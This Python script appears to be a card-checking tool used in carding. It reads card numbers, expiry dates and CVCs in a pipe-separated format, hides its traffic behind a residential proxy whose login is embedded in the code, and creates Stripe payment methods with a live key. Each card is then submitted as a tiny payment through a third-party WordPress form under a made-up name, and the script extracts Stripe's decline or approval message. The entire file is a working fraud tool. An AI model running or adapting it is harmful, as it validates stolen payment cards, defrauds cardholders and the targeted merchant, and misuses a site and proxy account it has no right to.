import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb53c070b35%3B+stripe-js-v3%2Fb53c070b35%3B+card-element&key=pk_live_51PRegF00TTHUs6jX6LXxmxDwrkbBQElrmJX4JVJBCwPqekhlkYKZkW4yUNMBgA7Ae8GggAsKdSACvG6QqnEXza8U00QlHuzENi'
	
	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'trainingedge.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://trainingedge.org',
	    'referer': 'https://trainingedge.org/order-your-certificate/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1748961671842',
	}
	
	data = f'data=__fluent_form_embded_post_id%3D1037%26_fluentform_8_fluentformnonce%3D1e05e2c65b%26_wp_http_referer%3D%252Forder-your-certificate%252F%26input_text%3DGeneral%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser08%2540gmail.com%26phone%3D%252B14303000850%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26payment_input_3%3DNone%26custom-payment-amount%3D0.508%26payment_method%3Dstripe%26names_1%255Bfirst_name%255D%3D%26names_1%255Blast_name%255D%3D%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=8'
	
	response = session.post(
	    'https://trainingedge.org/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
	
	return (result)
